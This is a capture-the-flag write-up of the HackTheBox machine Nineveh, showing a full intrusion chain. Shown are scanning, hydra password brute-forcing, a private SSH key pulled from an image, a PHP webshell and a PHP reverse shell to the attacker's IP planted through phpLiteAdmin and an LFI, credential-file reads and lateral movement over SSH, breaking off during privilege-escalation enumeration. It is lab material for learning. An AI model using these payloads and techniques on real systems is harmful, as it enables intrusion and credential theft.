# Nineveh | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~/iis6-exploit-2017-CVE-2017-7269]
└──╼ [★]$ sudo nmap -p- -A -T4 10.129.63.131
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 03:41 UTC
Nmap scan report for 10.129.63.131
Host is up (0.22s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   223.65 ms 10.10.14.1
2   223.72 ms 10.129.63.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.20 seconds
```
The machine is running an Apache server on 80 and 443 (SSL) with a common name in the certificate of nineveh.htb.

### 2. Enumeration
I can firstly visit the http site, which gives me the "it works" page for apache. Since the page made no attempt to apply SSL or redirect me to 443 I decide to enumerate http as well, starting with dirbusting from the root.
```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://nineveh.htb
[+] Threads:        20
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/17 13:05:14 Starting gobuster
===============================================================
/department (Status: 301)
===============================================================
2020/12/17 13:31:36 Finished
===============================================================
```
The /department directory has a login form that appears to be custom. I check for SQL injection and whilst doing so notice the errors given to the user whilst attempting to log in indicate valid usernames - if I enter "sdhafsd" as the username, I get told "invalid username", however if I try "admin" I only get "invalid password". With this in mind I can attempt an online attack of the password and see if it can be recovered.  
Note: Later whilst setting up the wordlist attack I also notice there's a comment in the HTML:
```html
</div>

<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->

        </div>
```
Browsing to the https site shows a cartoon image of two people in military clothing waving flags around. I can check the site certificate and see the email address given for it is admin@nineveh.htb.  
Following that I attempt to dirbust the site and get a /db directory and /secure_notes.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~/Desktop]
└──╼ [★]$ gobuster dir -u https://nineveh.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 30 -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://nineveh.htb
[+] Threads:        30
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/16 03:56:31 Starting gobuster
===============================================================
/db (Status: 301)
/server-status (Status: 403)
/secure_notes (Status: 301)
===============================================================
2020/12/16 04:24:06 Finished
===============================================================
```
The db directory has a login page for phpLiteAdmin v1.9. The default password "admin" doesn't work.  
The page also leaks a filepath via an SQL error at the top:  
*Warning: rand() expects parameter 2 to be integer, float given in /var/www/ssl/db/index.php on line 114.*  
  
Looking at /secure_notes, we get another image, this time something that looks to be an old egyptian painting. I assume there is likely to be notes in here, and so dirbust in here as well looking for txt files.  
While the dirbusting is runnig I download the image and inspect the metadata.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~]
└──╼ [★]$ exiftool nineveh.png 
ExifTool Version Number         : 12.10
File Name                       : nineveh.png
Directory                       : .
File Size                       : 2.8 MB
File Modification Date/Time     : 2017:07:02 23:50:02+00:00
File Access Date/Time           : 2020:12:16 04:40:41+00:00
File Inode Change Date/Time     : 2020:12:16 04:40:41+00:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1497
Image Height                    : 746
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8
Software                        : Shutter
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 1497x746
Megapixels                      : 1.1
```
Trailer data after the IEND chunk is irregular and suggests steganography may be in use.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~]
└──╼ [★]$ zsteg nineveh.png 
[?] 10240 bytes of extra data after image end (IEND), offset = 0x2bf8d0
extradata:0         .. file: POSIX tar archive (GNU)
    00000000: 73 65 63 72 65 74 2f 00  00 00 00 00 00 00 00 00  |secret/.........|
    00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
    *
    00000060: 00 00 00 00 30 30 30 30  37 35 35 00 30 30 30 30  |....0000755.0000|
    00000070: 30 34 31 00 30 30 30 30  30 34 31 00 30 30 30 30  |041.0000041.0000|
    00000080: 30 30 30 30 30 30 30 00  31 33 31 32 36 30 36 30  |0000000.13126060|
    00000090: 32 37 37 00 30 31 32 33  37 37 00 20 35 00 00 00  |277.012377. 5...|
    000000a0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
    *
    00000100: 
meta Software       .. text: "Shutter"
imagedata           .. file: little endian ispell 3.0 hash file,
b1,b,msb,xy         .. text: "VE6=Z&kk!"
b1,bgr,msb,xy       .. text: "tlS5TeG2Z"
b2,rgb,lsb,xy       .. text: "!k#T\"ex%"
b4,b,lsb,xy         .. file: PGP Secret Key -
b4,bgr,lsb,xy       .. file: PGP Secret Sub-key -
```
There appear to be numerous files within this image.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~]
└──╼ [★]$ binwalk -e --dd='.*' nineveh.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)
```
Check out the secrets directory that was extracted from the tar:
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~/_nineveh.png.extracted]
└──╼ [★]$ ls
0  2BF8D0.tar  54  54-0  secret
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-f3ozktf1hc]─[~/_nineveh.png.extracted]
└──╼ [★]$ cat secret/*
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```
From here I backtrack to the phpLiteAdmin v1.9 page. Though the application has vulnerabilities such as LFI/RCE, it is all authenticated stuff. To authenticate I need to guess the password, which is made easier because there is no CSRF or limiting on the form. I therefore have two potential points of entry via the /department and phpLiteAdmin forms.

### 3. Recover department password and login
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-3hrv0spjom]─[~]
└──╼ [★]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -t 32
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-17 13:21:40
[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344398 login tries (l:1/p:14344398), ~448263 tries per task
[DATA] attacking http-post-form://nineveh.htb:80/department/login.php:username=^USER^&password=^PASS^:Invalid Password!
[STATUS] 1668.00 tries/min, 1668 tries in 00:01h, 14342730 to do in 143:19h, 32 active
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-17 13:24:25
```
The valid credentals for the department login form are `admin:1q2w3e4r5t`.  
  
Upon logging in, there is an "under construction" image, and then one other page - a notes page, which shows some notes relating to other stuff I've already looked at earlier.
```
Have you fixed the login page yet! hardcoded username and password is really bad idea!

check your serect folder to get in! figure it out! this is your challenge

Improve the db interface.
~amrois
```
However I notice the notes page is getting the content from a parameter in the URL like so:
```
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
```
This indicate a possible LFI vuln but I can't find any way to read files aside from the notes that is provided by the page. It's possible there is filtering in place which prevents other files from being accessed.

### 4. Recover phpLiteAdmin login cred
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-3hrv0spjom]─[~/writeups/HackTheBox/HTB_Nineveh]
└──╼ [★]$ hydra -l '' -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 32
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-17 14:59:18
[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344398 login tries (l:1/p:14344398), ~448263 tries per task
[DATA] attacking http-post-forms://nineveh.htb:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password
[STATUS] 909.00 tries/min, 909 tries in 00:01h, 14343489 to do in 262:60h, 32 active
[443][http-post-form] host: nineveh.htb   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-17 15:01:03
```
The password for the admin panel is `password123`.  
  
When logging in, there is a single "test" database with no tables. Other information for this database:
```
Database name: test
Path to database: /var/tmp/test
Size of database: 1 KB
Database last modified: 7:52pm on July 2, 2017
SQLite version: 3.11.0
SQLite extension [?]: PDO
PHP version: 7.0.18-0ubuntu0.16.04.1
```

### 5. Get a shell
phpLiteAdmin is subject to an RCE vulnerability, the details of which are (from https://www.exploit-db.com/exploits/24044):
  
*phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.',
An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.*
  
I can test the proof of concept, which runs the code displaying the PHP info page to test that it works. To access the file, I can set up a basic PHP webshell with the filename ninevehNotes.txt_shell.php and try to access it via the department page LFI.  
Create the database:
```
Database name: ninevehNotes.txt_shell.php
Path to database: /var/tmp/ninevehNotes.txt_shell.php
Size of database: 1 KB
Database last modified: 4:42am on December 18, 2020
SQLite version: 3.11.0
SQLite extension [?]: PDO
PHP version: 7.0.18-0ubuntu0.16.04.1
```
Create table:
```
Table 'shell' has been created.
CREATE TABLE 'shell' ('<?php if(isset($_REQUEST[''cmd''])){ echo "<pre>"; $cmd = ($_REQUEST[''cmd'']); system($cmd); echo "</pre>"; die; } ?>' TEXT)
```
When I try to use the LFI to read this file, I get an error:
*Warning:  include(): Failed opening '/var/tmp/ninevehNotes.txt_shell.php?cmd=id' for inclusion (include_path='.:/usr/share/php') in /var/www/html/department/manage.php on line 31*  
What I take this to mean is that although the file is now being accessed and executed, I can't pass params to it this way. So I guess I just have to go all in and use reverse shell code without params.
```
Query used to create this table
CREATE TABLE 'shell' ('<?php $sock=fsockopen("10.10.14.162",9999);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>' TEXT)
```
Access the file to run the code with my listener on, catch shell:
```bash
┌──(kali㉿kali)-[~/Desktop/htb/nineveh/utils]
└─$ nc -lvnp 9999                   
listening on [any] 9999 ...
connect to [10.10.14.162] from (UNKNOWN) [10.129.64.187] 51314
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

### 6. Enumerate from foothold
First I can check out the code with the filtering (more out of interest than anything)
```php
www-data@nineveh:/var/www/html/department$ cat manage.php
<?php 
session_start();


  if (!isset($_SESSION['username'])){
      header("Location: login.php");
      die();
  } else {
  require "header.php";
?>

<div class="row">
  <div class="col-lg-12">
      <?php if (isset($error)) { ?>
          <span class="text text-danger"><b><?php echo $error; ?></b></span>
      <?php } ?>
    <h2>Hi <?php echo $_SESSION['username']; ?>,</h2>
        <img src=./underconstruction.jpg alt="Under Construction!" style="width:800px;height:600px;"> <br>
  </div>
</div>
<?php if(isset($_GET['notes'])){ ?>
<pre>
<?php
  $file = @$_GET['notes'];
  if(strlen($file) > 55)
     exit("File name too long.");
  $fileName = basename($file);
  if(!strpos($file, "ninevehNotes"))
    exit("No Note is selected.");
  echo "<pre>";
  include($file);
  echo "</pre>";
?>

</pre> 

<?php } ?>

<?php
  require "footer.php"; }
?>
```
The code does indeed filter out any files that do not have "ninevehNotes" in the name.  
Check running processes:
```bash
$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.5  37976  6008 ?        Ss   04:02   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    04:02   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    04:02   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   04:02   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    04:02   0:00 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    04:02   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    04:02   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S    04:02   0:00 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    04:02   0:00 [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   04:02   0:00 [netns]
root        13  0.0  0.0      0     0 ?        S<   04:02   0:00 [perf]
root        14  0.0  0.0      0     0 ?        S    04:02   0:00 [khungtaskd]
root        15  0.0  0.0      0     0 ?        S<   04:02   0:00 [writeback]
root        16  0.0  0.0      0     0 ?        SN   04:02   0:00 [ksmd]
root        17  0.0  0.0      0     0 ?        SN   04:02   0:00 [khugepaged]
...
root       279  0.0  0.0      0     0 ?        S<   04:02   0:00 [bioset]
root       349  0.0  0.0      0     0 ?        S<   04:02   0:00 [raid5wq]
root       384  0.0  0.0      0     0 ?        S<   04:02   0:00 [bioset]
root       412  0.0  0.0      0     0 ?        S    04:02   0:00 [jbd2/sda1-8]
root       413  0.0  0.0      0     0 ?        S<   04:02   0:00 [ext4-rsv-conver]
root       455  0.0  0.0      0     0 ?        S<   04:02   0:00 [kworker/0:1H]
root       480  0.0  0.2  28360  2716 ?        Ss   04:02   0:00 /lib/systemd/systemd-journald
root       487  0.0  0.0      0     0 ?        S    04:02   0:00 [kauditd]
root       497  0.0  0.0      0     0 ?        S<   04:02   0:00 [iscsi_eh]
root       501  0.0  0.0      0     0 ?        S<   04:02   0:00 [ib_addr]
root       503  0.0  0.1  94776  1612 ?        Ss   04:02   0:00 /sbin/lvmetad -f
root       512  0.0  0.4  44572  4104 ?        Ss   04:02   0:00 /lib/systemd/systemd-udevd
root       518  0.0  0.0      0     0 ?        S<   04:02   0:00 [ib_mcast]
root       519  0.0  0.0      0     0 ?        S<   04:02   0:00 [ib_nl_sa_wq]
root       522  0.0  0.0      0     0 ?        S<   04:02   0:00 [ib_cm]
root       525  0.0  0.0      0     0 ?        S<   04:02   0:00 [iw_cm_wq]
root       527  0.0  0.0      0     0 ?        S<   04:02   0:00 [rdma_cm]
root       595  0.0  0.9 194416 10124 ?        Ssl  04:02   0:03 /usr/bin/vmtoolsd
systemd+   619  0.0  0.2 100328  2600 ?        Ssl  04:02   0:00 /lib/systemd/systemd-timesyncd
syslog     934  0.0  0.3 256404  3428 ?        Ssl  04:02   0:00 /usr/sbin/rsyslogd -n
root       935  0.0  0.6 275772  6320 ?        Ssl  04:02   0:00 /usr/lib/accountsservice/accounts-daemon
message+   937  0.0  0.3  42896  3820 ?        Ss   04:02   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       952  0.0  0.3  29012  3100 ?        Ss   04:02   0:00 /usr/sbin/cron -f
root       955  0.0  1.8 263820 18604 ?        Ssl  04:02   0:00 /usr/lib/snapd/snapd
daemon     961  0.0  0.2  26048  2308 ?        Ss   04:02   0:00 /usr/sbin/atd -f
root       970  0.4  0.6 629660  6176 ?        Ssl  04:02   0:20 /usr/bin/lxcfs /var/lib/lxcfs/
root       971  0.0  0.9  85440  9204 ?        Ss   04:02   0:00 /usr/bin/VGAuthService
root       972  0.0  0.1  20104  1136 ?        Ss   04:02   0:00 /lib/systemd/systemd-logind
root       980  0.0  0.1   4404  1276 ?        Ss   04:02   0:00 /usr/sbin/acpid
root      1010  0.0  0.5 277184  5968 ?        Ssl  04:02   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1025  0.0  0.0  13380   168 ?        Ss   04:02   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1166  0.0  0.2  16124  2756 ?        Ss   04:02   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.ens160.pid -lf /var/lib/dhcp/dhclient.ens160.leases -I -df /var/lib/dhcp/dhclient6.ens160.leases ens160
root      1318  0.0  0.5  65524  5296 ?        Ss   04:02   0:00 /usr/sbin/sshd -D
root      1339  0.0  0.0   5228   156 ?        Ss   04:02   0:00 /sbin/iscsid
root      1340  0.0  0.3   5728  3524 ?        S<Ls 04:02   0:00 /sbin/iscsid
root      1415  0.0  0.1  15944  1824 tty1     Ss+  04:02   0:00 /sbin/agetty --noclear tty1 linux
root      1435  0.0  2.5 270376 25940 ?        Ss   04:02   0:00 /usr/sbin/apache2 -k start
www-data  1438  0.0  1.6 271056 16652 ?        S    04:02   0:00 /usr/sbin/apache2 -k start
www-data  1439  0.0  1.6 271072 17140 ?        S    04:02   0:00 /usr/sbin/apache2 -k start
www-data  1440  0.0  1.6 271384 17256 ?        S    04:02   0:00 /usr/sbin/apache2 -k start
www-data  1441  0.0  1.6 270936 17128 ?        S    04:02   0:00 /usr/sbin/apache2 -k start
www-data  1442  0.0  1.6 271000 17112 ?        S    04:02   0:00 /usr/sbin/apache2 -k start
root      7242  0.0  0.0      0     0 ?        S    04:08   0:00 [kworker/0:0]
root      7243  0.0  0.0      0     0 ?        S    04:08   0:00 [kworker/u2:0]
www-data 15096  0.0  1.2 270844 12884 ?        S    04:50   0:00 /usr/sbin/apache2 -k start
root     15894  0.0  0.0      0     0 ?        S    04:17   0:00 [kworker/0:1]
www-data 16258  0.0  0.2  34428  2948 ?        R    05:25   0:00 ps aux
www-data 19723  0.0  1.6 271460 17188 ?        S    04:21   0:00 /usr/sbin/apache2 -k start
www-data 19724  0.0  1.7 271520 17640 ?        S    04:21   0:00 /usr/sbin/apache2 -k start
www-data 19725  0.0  1.6 271060 16768 ?        S    04:21   0:00 /usr/sbin/apache2 -k start
www-data 29460  0.0  0.0   4512   704 ?        S    05:05   0:00 sh -c /bin/sh -i
www-data 29461  0.0  0.0   4512   712 ?        S    05:05   0:00 /bin/sh -i
```
Interestingly it looks like there is an ssh daemon running, despite there not being any SSH service externally available. There is also a user in the passwd file:
```bash
$ cat etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
```
Additionally, I can see in amoris' directory, he has an .ssh directory with an authorized_keys file. At this point I figure I am looking for a way to enable external ssh access on the machine.

### 7. Lateral movement

First thing I try is seeing if I can SSH internally from www-data. Firstly I need to copy the private key to the machine.
```bash
www-data@nineveh:/tmp$ wget http://10.10.14.162:8000/nineveh.priv
--2020-12-18 05:49:51--  http://10.10.14.162:8000/nineveh.priv
Connecting to 10.10.14.162:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1675 (1.6K) [application/octet-stream]
Saving to: 'nineveh.priv'

nineveh.priv        100%[===================>]   1.64K  --.-KB/s    in 0.02s   

2020-12-18 05:49:52 (74.2 KB/s) - 'nineveh.priv' saved [1675/1675]

www-data@nineveh:/tmp$ chmod 600 nineveh.priv
```
Then login.
```bash
www-data@nineveh:/tmp$ ssh -i nineveh.priv amrois@localhost
Could not create directory '/var/www/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

287 packages can be updated.
206 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ whoami
whoami
amrois
```

### 8. Enumerate from user
I start with some enumeration using linpeas (see linpeas_out.txt). When reading the output I noticed that there was a cron job running which called /usr/sbin/report-reset.sh.
```
*/10 * * * * /usr/sbin/report-reset.sh
```
The script is called every 10 minutes. Check out the contents:
```bash
amrois@nineveh:~$ cat /usr/sbin/report-reset.sh
#!/bin/bash

rm -rf /report/*.txt
```
It is removing .txt files from the /report directory. Let's now check out the contents of that directory:
```bash
eport-20-12-18:06:10.txt  report-20-12-18:06:11.txt  report-20-12-18:06:12.txt
amrois@nineveh:/report$ cat * | head -n 100
cat * | head -n 100
ROOTDIR is `/'
Checking `amd'... not found
Checking `basename'... not infected
Checking `biff'... not found
Checking `chfn'... not infected
...
Checking `ldsopreload'... can't exec ./strings-static, not tested
Checking `login'... not infected
Checking `ls'... not infected
Checking `lsof'... not infected
Checking `mail'... not found
Checking `mingetty'... not found
Checking `netstat'... not infected
Checking `named'... not found
Checking `passwd'... not infected
Checking `pidof'... not infected
..
Checking `tcpdump'... not infected
Checking `top'... not infected
Checking `telnetd'... not found
Checking `timed'... not found
Checking `traceroute'... not found
Checking `vdir'... not infected
Checking `w'... not infected
Checking `write'... not infected
Checking `aliens'... no suspect files
Searching for sniffer's logs, it may take a while... nothing found
Searching for HiDrootkit's default dir... nothing found
Searching for t0rn's default files and dirs... nothing found
Searching for t0rn's v8 defaults... nothing found
Searching for Lion Worm default files and dirs... nothing found
Searching for RSHA's default files and dir... nothing found
Searching for RH-Sharpe's default files... nothing found
Searching for Ambient's rootkit (ark) default files and dirs... nothing found
Searching for suspicious files and dirs, it may take a while... 
/lib/modules/4.4.0-62-generic/vdso/.build-id
/lib/modules/4.4.0-62-generic/vdso/.build-id
Searching for LPD Worm files and dirs... nothing found
Searching for Ramen Worm files and dirs... nothing found
Searching for Maniac files and dirs... nothing found
Searching for RK17 files and dirs... nothing found
Searching for Ducoci rootkit... nothing found
Searching for Adore Worm... nothing found
Searching for ShitC Worm... nothing found
Searching for Omega Worm... nothing found
Searching for Sadmind/IIS Worm... nothing found
Searching for MonKit... nothing found
Searching for Showtee... nothing found
Searching for OpticKit... nothing found
Searching for T.R.K... nothing found
Searching for Mithra... nothing found
